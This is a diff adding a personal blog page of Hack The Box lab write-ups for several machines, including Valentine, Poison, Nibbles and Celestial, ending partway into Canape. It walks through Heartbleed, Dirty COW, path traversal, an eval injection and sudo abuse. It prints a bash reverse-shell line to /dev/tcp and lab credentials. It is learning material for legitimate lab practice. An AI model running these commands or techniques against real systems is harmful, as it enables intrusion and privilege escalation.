@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Hack The box - lmkalg's blog</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Hack The box", url: "#_top", children: [
+              {title: "Solving the First challenge (Registration)", url: "#solving-the-first-challenge-registration" },
+              {title: "Bashed (User)", url: "#bashed-user" },
+              {title: "Valentine (User &amp; root)", url: "#valentine-user-root" },
+              {title: "Poison (User &amp; root)", url: "#poison-user-root" },
+              {title: "Nibbles (User &amp; Rooted)", url: "#nibbles-user-rooted" },
+              {title: "Celestial (User &amp; Rooted)", url: "#celestial-user-rooted" },
+              {title: "Canape (User &amp; root)", url: "#canape-user-root" },
+              {title: "Olympus", url: "#olympus" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="hack-the-box">Hack The box</h1>
+<h2 id="solving-the-first-challenge-registration">Solving the First challenge (Registration)</h2>
+<p>In order to join to the platform, you should solve the first challenge.</p>
+<p>Once in the <strong>JOIN</strong> section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: <strong>/js/inviteapi.min.js</strong>. After openning and formating it:</p>
+<pre><code class="language-javascript">
+eval(
+    function  (p,a,c,k,e,d){
+        e = function(c){return c.toString(36)};
+        if ( !''.replace(/^/,String)){
+            while(c--){
+                d[c.toString(a)] = k[c] || c.toString(a)
+            }
+            k = [function(e){return d[e]}];
+            e = function(){return'\\w+'};
+            c = 1
+        };
+        while(c--){
+            if (k[c]){
+                p = p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])
+            }
+        }
+        return p    
+    }
+    ('1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
+    24,
+    24,
+    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
+    0,
+    {}
+    )
+)
+
+</code></pre>
+<p>So basically, it's a JS functiont that it's being called with some specific parameters.</p>
+<p>It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy &amp; paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:</p>
+<p><img alt="script result" src="../images/script_result.png" /></p>
+<p>The answer gathered is again JS code:</p>
+<pre><code class="language-javascript">
+function verifyInviteCode(code){
+    var formData = {&quot;code&quot;:code};
+    $.ajax({
+        type:&quot;POST&quot;,
+        dataType:&quot;json&quot;,
+        data:formData,url:'/api/invite/verify',
+        success:function(response){
+            console.log(response)
+        },
+        error:function(response){
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode(){
+    $.ajax({
+        type:&quot;POST&quot;,
+        dataType:&quot;json&quot;,
+        url:'/api/invite/how/to/generate',
+        success:function(response){
+            console.log(response)
+        },
+        error:function(response){
+            console.log(response)
+        }
+    })
+}
+
+</code></pre>
+<p>This time seems to show us how the <strong>InviteCode</strong> related functions are invoked... Time to use <strong>burp</strong>:</p>
+<p>Issuing the following POST we will receive an answer with some information encoded: </p>
+<pre><code>
+POST /api/invite/how/to/generate HTTP/1.1
+Host: www.hackthebox.eu
+Connection: close
+Accept: */*
+
+</code></pre>
+<pre><code>
+{&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl&quot;,&quot;enctype&quot;:&quot;BASE64&quot;},&quot;0&quot;:200}
+
+</code></pre>
+<p>After decoding the value inside <strong>data</strong> which is encoded with the encoding mentioned in <strong>enctype</strong>, you'll get the a message saying:
+<strong>In order to generate the invite code, make a POST request to /api/invite/generate</strong></p>
+<p>So, let folow their order:</p>
+<pre><code>
+POST /api/invite/generate HTTP/1.1
+Host: www.hackthebox.eu
+Connection: close
+Accept: */*
+
+</code></pre>
+<pre><code>
+{&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=&quot;,&quot;format&quot;:&quot;encoded&quot;},&quot;0&quot;:200}
+
+</code></pre>
+<p>And here it is.. Our <strong>code</strong> is encoded in base64. Once decoded you'll get your code:</p>
+<p><strong>XIKAY-XYEZO-NJZLJ-USEAS-ZBALN</strong> (in my case).</p>
+<h3 id="disclaimer">Disclaimer</h3>
+<p>I did the challenge again for the write up because I forgot to do it the first time.
+This time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about "This IP can't use the code" was triggered. I solved it just connecting through a VPN.</p>
+<h2 id="bashed-user">Bashed (User)</h2>
+<h3 id="user">User</h3>
+<p>This machine was pretty easy.
+First of all I used <strong>dirb</strong> to start listing some common directories.</p>
+<pre><code class="language-bash">
+dirb http://10.10.10.68 common.txt
+
+</code></pre>
+<p>Some directories were found:</p>
+<p><img alt="dirb directories" src="../images/bashed/dirb.png" /></p>
+<p>The <strong>dev</strong> seemed to be the most interesting one, therefore I started from there:</p>
+<p><img alt="dev index" src="../images/bashed/dev_index.png" /></p>
+<p>And once inside <strong>phpbash.php</strong>:</p>
+<p><img alt="dev index" src="../images/bashed/user_hash.png" /></p>
+<h3 id="root">Root</h3>
+<p><strong>TBD</strong></p>
+<h2 id="valentine-user-root">Valentine (User &amp; root)</h2>
+<h3 id="user_1">User</h3>
+<p>So, in order to start, as always, I used <strong>nmap</strong>:</p>
+<p><img alt="nmap" src="../images/valentine/nmap.png" /></p>
+<p><strong>SSH</strong>, <strong>HTTP</strong>, <strong>HTTPS</strong>. Let's navigate the web servers while we wait for <strong>dirb</strong> again.</p>
+<p>The index of both webservers is an image of a woman like shouting and the logo of <strong>heartbleed</strong>:</p>
+<p><img alt="index page" src="../images/valentine/webserver_index_image.png" /></p>
+<p>From last machine I learn that inside <strong>/dev/</strong> something could appear. Let's try...:</p>
+<p><img alt="index_dev" src="../images/valentine/index_dev.png" /></p>
+<p>Well, that was lucky. Inside the <strong>notes.txt</strong> there isn't anything interesting, but inside <strong>hype_key</strong>, there is some <strong>encoded</strong> text. Seems to be printable hex, so let's try to decode it: <a href="https://www.rapidtables.com/convert/number/hex-to-ascii.html">hex to ascii</a></p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+
+</code></pre>
+<p>Nice! We have a private key... but what for? Maybe to login by <strong>ssh</strong>? We still need the passphrase for it... 
+I was expecting that <strong>dirb</strong> helped me with the output, but .. unfortunately, it didn't helped me. There were some <strong>php</strong> scrips that seemed to encode/decode base64, but nothing else (well, it has the <strong>/dev</strong> directory):</p>
+<p><img alt="dirb output" src="../images/valentine/dirb.png" /></p>
+<p>Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?
+To perform this part I used <strong>Metasploit</strong> because it already had a <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed">module</a> to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:</p>
+<p><img alt="msf scan" src="../images/valentine/msf_scan_heartbleed.png" /></p>
+<p><img alt="msf dump" src="../images/valentine/msf_dump_heartbleed.png" /></p>
+<p>After analzing these samples, I found a very interesting thing. There was an HTTP request there:</p>
+<p><img alt="msf dump output" src="../images/valentine/msf_dump_output.png" /></p>
+<p>It was using one the <strong>.php</strong> scripts that we found thanks to <strong>dirb</strong>, which was <strong>decode.php</strong>.. Let's try to decode it:</p>
+<p><img alt="passphrase" src="../images/valentine/passphrase.png" /></p>
+<p><strong>YEAH!</strong> seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?</p>
+<p>In order to ensure it, I issued the following command</p>
+<pre><code class="language-bash">ssh-keygen -y -f rsa_key.pem
+</code></pre>
+<p>with <strong>rsa_key.pem</strong> being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase <strong>heartbleedbelievethehype</strong> the public key was successfully created.</p>
+<p>So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via <strong>SSH</strong>. But still, we don't know the user. I spent a <strong>LOOOONGG</strong> time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that <strong>valentine</strong> had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...</p>
+<p>I spent lot of time trying to find the correct user:</p>
+<ul>
+<li>Looking on new samples of memory gathered by exploiting heartbleed.</li>
+<li>Looking in the page source code of the pages hosted in the HTTP Server.</li>
+<li>Trying with common users (guest, www-data, etc).</li>
+<li>Among others.</li>
+</ul>
+<p>Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called <strong>hype_key</strong>. So I literally ran to type the following command, which <strong>fortunately</strong> gave me access to the machine.</p>
+<pre><code>ssh -v -i rsa_key.pem hype@10.10.10.79
+</code></pre>
+<p>Once inside, it was just needed to go to the home directory of this user, and find the <strong>user.txt</strong> file with the hash inside.</p>
+<h3 id="root_1">Root</h3>
+<p>I copied the <strong>LinEnum.sh</strong> file to the vm, and made a scan but the path finally wasn't that one.
+I wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:</p>
+<pre><code class="language-bash">uname -a 
+Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<p>So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on <strong>perf_swevent_init</strong> and other two related to <strong>dity cow</strong>. Unfortunately, there didn't work (don't know why, specially the latest).</p>
+<p>Finally, I found some <a href="https://www.youtube.com/watch?v=0BHFT8YkApI">video</a> explaining how to use a variant of <strong>dirty cow</strong> to modify the <strong>/etc/passwd/</strong> file in order to create a new user with id 0 (root privileges). <a href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">Exploit</a></p>
+<p>The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set. </p>
+<p><img alt="dirty cow" src="../images/valentine/dirty_cow_on_action.png" /></p>
+<p><img alt="root flag" src="../images/valentine/root_flag.png" /></p>
+<h2 id="poison-user-root">Poison (User &amp; root)</h2>
+<h3 id="user_2">User</h3>
+<p>So, started with the usual nmap command: 
+<img alt="nmap" src="../images/poison/nmap.png" /></p>
+<p>We have a lot of things to attack. Let's start with the http. </p>
+<p>First page ask you to choose one script.. Let's took <strong>listfiles.php</strong>...</p>
+<p><img alt="scripts" src="../images/poison/scripts.png" /></p>
+<p><img alt="listfiles.php" src="../images/poison/listfiles.png" /></p>
+<p>The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called <strong>pwdbackup.txt</strong>. I'd like to read it.. so.. what happens if we change the file param of the url? </p>
+<p><img alt="pswdbackup" src="../images/poison/passwd_backup.png" /></p>
+<p>Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:</p>
+<pre><code class="language-python">import base64 
+
+password = &quot;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&quot;
+
+for _ in xrange(13):
+    password = base64.decodestring(password)
+
+print password
+</code></pre>
+<p>Once executed.. the answer is: <strong>Charix!2#4%6&amp;8(0</strong>.
+Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. 
+What if we use again the path traversal vuln?:</p>
+<p><img alt="etc passwd" src="../images/poison/etc_passwd.png" /></p>
+<p>Perfect. There is a user called <strong>charix</strong>, due to the password has also that string, I guess is the correct user for our password.
+Let's try an ssh connection: </p>
+<p><img alt="user flag" src="../images/poison/user_flag.png" /></p>
+<h3 id="root_2">Root</h3>
+<p>Ok, once I started using <strong>LinEnum.sh</strong>, looking for filesystem files, doing enumeration basically. The first thing, is the <strong>secret.zip</strong> file which is placed in the home of charix. </p>
+<p>I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. </p>
+<p>Then, I continued enumerating and discovered some processes running as root listeining only in localhost: </p>
+<p><img alt="process localhost" src="../images/poison/processes_localhost.png" /></p>
+<p>In particular, <strong>Xvnc</strong> and <strong>sendmail</strong> sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. </p>
+<p>So I looked for some commands in the machine (just pressing vnc<TAB>) and found <strong>vncpasswd</strong>. Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:</p>
+<p><img alt="vncpasswd and file" src="../images/poison/decrypting_passwd_file.png" /></p>
+<p>So, after "catting" I realise that was more or less the same format as the file that I already decompressed from the ZIP. 
+So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was <a href="https://github.com/jeroennijhof/vncpwd">one</a>.</p>
+<p>After using it, get the password <strong>VNCP@$$!</strong>.</p>
+<p>This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.</p>
+<p>At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:</p>
+<pre><code class="language-bash">ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84
+</code></pre>
+<p>Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: 
+<img alt="remmina" src="../images/poison/remmina_config.png" /></p>
+<p><img alt="root flag" src="../images/poison/root_flag.png" /></p>
+<p>YEAH! I had to copy it char by char xD.</p>
+<h2 id="nibbles-user-rooted">Nibbles (User &amp; Rooted)</h2>
+<h3 id="user_3">User</h3>
+<p>Reading comments. Found</p>
+<pre><code class="language-html">&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
+</code></pre>
+<p>Ran dirbuster against http://10.10.10.75/nibbleblog/ 
+Found <strong>admin.php</strong>.</p>
+<p>Tried with some default credentials:</p>
+<ul>
+<li>admin:admin</li>
+<li>nibbles:nibbles</li>
+<li>admin:nibbles <strong>(GOT IT!)</strong></li>
+</ul>
+<p>Tried to look for a LFI in some upload of images (new page, new post) without luck..</p>
+<p>Search in google for nibbleblog: <strong>It is a well-known CMS!</strong>.. Looking for exploit: YEAH! INside <strong>MSF</strong>.</p>
+<p>Run the exploit:</p>
+<p><img alt="msf_exploit" src="../images/nibbles/msf_exploit.png" /></p>
+<p>Once with the meterpreter.</p>
+<pre><code class="language-bash">cat /etc/passsd
+</code></pre>
+<p>Showed me, that there was only one user interesting called <strong>nibbler</strong>.</p>
+<pre><code class="language-bash">whoami
+</code></pre>
+<p>returned also <strong>nibbler</strong>.</p>
+<p>Went to /home/nibbler and...:
+<img alt="user_flag" src="../images/nibbles/user_flag.png" /></p>
+<h3 id="root_3">Root</h3>
+<p>So, first step was to create a reverse shell.. In order to do that I did:</p>
+<p><strong> On my local machine </strong></p>
+<pre><code class="language-bash">sudo ufw allow 3333
+nc -lnvp 3333
+</code></pre>
+<p><strong> On the remote machine</strong></p>
+<pre><code class="language-bash">bash -i
+bash -i &gt;&amp; /dev/tcp/IP/3333 0&gt;&amp;1
+</code></pre>
+<p><img alt="reverse_shell" src="../images/nibbles/reverse_shell.png" /></p>
+<p>Once I have the reverse shell in my local pc, I "upgraded" to a full tty (I learned this trick by looking this <a href="https://www.youtube.com/watch?v=uc3pMrIbP88">video</a>).</p>
+<p>So next step was use the <strong>LinEnum.sh</strong>. I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).</p>
+<p>Once I ran it, one of the outputs was:</p>
+<pre><code class="language-bash">User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+[+] Possible sudo pwnage!
+-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+<p>This basicall means that there is a misconfiguration in the <strong>/etc/sudoers</strong> file which allows the user <strong>nibbler</strong> to execute any <strong>monitor.sh</strong> as root, without prompting any password. So my next step was simply:</p>
+<pre><code class="language-bash">echo &quot;cat /root/root.txt&quot; &gt; /home/nibbler/personal/stuff/monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+<p><strong>It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works</strong></p>
+<p>The output was the flag =):</p>
+<p><img alt="root_flag" src="../images/nibbles/root_flag.png" /></p>
+<h2 id="celestial-user-rooted">Celestial (User &amp; Rooted)</h2>
+<h3 id="user_4">User</h3>
+<p>After the nmap output we see that there is an open port running express js: 
+<img alt="nmap" src="./images/nmap.png" /></p>
+<p>Next step was to run <strong>dirb</strong> against it, while I went to see this page using a web browser.</p>
+<p>Once we enter with the browser, a <strong>CUSTOM</strong> page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the <strong>set-cookie</strong> is present, and the payload seems to be base64. </p>
+<p><img alt="set cookie" src="../images/celestial/set_cookie.png" /></p>
+<p>If we refresh the page we will see this output:</p>
+<p><img alt="hey dummy" src="../images/celestial/hey_dummy.png" /></p>
+<p>And if we decode the cookie, we'll have:</p>
+<pre><code class="language-json">{&quot;username&quot;:&quot;Dummy&quot;,&quot;country&quot;:&quot;Idk Probably Somewhere Dumb&quot;,&quot;city&quot;:&quot;Lametown&quot;,&quot;num&quot;:&quot;2&quot;}
+</code></pre>
+<p>So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying <strong>Dummy</strong> and <strong>2</strong>.  So I changed the <strong>num</strong> for an "a" and the following I received the following response:</p>
+<p><img alt="eval" src="../images/celestial/eval.png" /></p>
+<p>This was great. If you pay attention to the response, you'll see that the error cames from an <strong>eval</strong> function. So basically this means that they we can execute arbitrary JS code?.. Let's see..:</p>
+<p><img alt="payload_test" src="../images/celestial/payload_test.png" /></p>
+<p>After a couple of tests I realize that the server was doing something like:</p>
+<pre><code class="language-javascript">...
+eval(&quot;num + num&quot;);
+...
+</code></pre>
+<p>That's why I appended "//" to the final of the payload in order to comment the rest of the line.</p>
+<p>So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it.</p>
+<p><img alt="reverse shell" src="../images/celestial/reverse_shell.png" /></p>
+<p>Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the <strong>Documents</strong> directory.</p>
+<h3 id="root_4">Root</h3>
+<p>This part was very straightforward... 
+Once I get the user shell, I start seeing the files that were in the <strong>/home/user</strong> directory and there was a strange file called <strong>output.txt</strong> which was own by root, but readeable for everyone. This file just contained the message " Script is running ".</p>
+<p>Afterwards, I found a python script in the <strong>Documents</strong> directory of the user, that just had the following line </p>
+<pre><code class="language-python">print &quot;Script is running...&quot;
+</code></pre>
+<p>The <strong>output.txt</strong> was being written each 5 minutes. So quickly I understood that this script was being executed by the <strong>root</strong> user and the output was written to this <strong>txt</strong> file. </p>
+<p>So, why I did was to edit the script and add the following lines:</p>
+<pre><code class="language-python">content = open(&quot;/root/root.txt&quot;,&quot;r&quot;).read()
+print content
+</code></pre>
+<p>After 5 minutes (or less) the output was written again, and the content was the flag: </p>
+<p><img alt="root" src="../images/celestial/root.png" />    </p>
+<h2 id="canape-user-root">Canape (User &amp; root)</h2>
+<h3 id="user_5">User</h3>
+<p>This was my favorite machine so far. Thanks: @overcast!.
+So, as always, lets start with nmap:</p>
+<pre><code class="language-bash">$&gt; nmap -sC -sV 10.10.10.70  &gt; nmap
+</code></pre>
+<p>And here is the output:</p>
+<p><img alt="nmap canape" src="../images/canape/nmap.png" /></p>
+<p>Great, while we go to the HTTP server, I'll let an nmap full scan running..
+Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet..
+Looking to the source code of the main page, we find this: </p>
+<p><img alt="commit source code" src="../images/canape/hash_commit_source_code.png" /></p>
+<p>Ok..  Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck.  Then, I realized that the nmap has discovered a <strong>.git</strong> directory, so I proceed to download it: </p>
+<pre><code class="language-bash">$&gt; wget --recursive --no-parent http://10.10.10.70/.git/
+</code></pre>
+<p>Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application.</p>
+<p><img alt="logs" src="../images/canape/git_logs.png" /></p>
+<p>Just in a few words, this application had to main entrypoints:</p>
+<ul>
+<li><strong>submit</strong>: Where you can submit your quote, and it will stored using <strong>Pickle</strong>.</li>
+<li><strong>check</strong>: Where it will load the content of your quote <strong>as a Pickle</strong> and show it back to you.</li>
+</ul>
+<p>I searched for some tutorials of how to exploit this and fortunately I found a couple of them. </p>
+<p>So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working.</p>
+<p>I started to go back on my steps, and figured it out something crucial. The <strong>submit</strong> endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character &amp; quote content: </p>
+<pre><code class="language-python">...
+p_id = base64.b64encode(char + quote)[:10]
+...
+</code></pre>
+<p>Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash 
+of the concatenation:</p>
+<pre><code>git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1
+    -    p_id = base64.b64encode(char + quote)[:10]
+    +    p_id = md5(char + quote).hexdigest()
+</code></pre>
+<p>So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. </p>
+<p>This was final version of the python application:</p>
+<pre><code class="language-python">import string
+import random
+import base64
+import cPickle
+from flask import Flask, render_template, request
+from hashlib import md5
+
+app = Flask(__name__)
+
+@app.errorhandler(404)
+def page_not_found(e):
+    if random.randrange(0, 2) &gt; 0:
+        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
